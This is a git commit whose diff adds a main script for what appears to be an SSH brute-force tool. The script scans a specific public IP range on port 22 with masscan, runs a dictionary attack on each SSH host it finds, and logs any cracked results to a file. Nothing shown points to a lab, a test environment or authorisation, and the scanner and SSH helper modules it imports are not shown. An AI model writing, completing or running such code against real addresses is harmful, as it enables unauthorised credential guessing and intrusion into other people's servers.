9ede7367905cbdbbb79c14e01d60c5db59c2742e
leaf48 <watavita2004@gmail.com>
2024-10-04 19:29:28 -0700

    feat: main thread

---
+++ src/main.py
@@ -0,0 +1,16 @@
+import datetime
+from scanner.masscan import Masscan
+from _ssh.ssh_client import SSH_Client
+
+if "__main__" == __name__:
+    timestamp = datetime.datetime.now().isoformat()
+
+    ips = Masscan.scan("160.251.100.0/24", "22", "1000")
+
+    for i in ips:
+        ssh_client = SSH_Client(i, "22")
+        ssh_client.dictionary_attack()
+
+        if ssh_client.result is not None:
+            with open(f"result_{timestamp}.txt", "a") as file:
+                file.write(ssh_client.result + "\n")
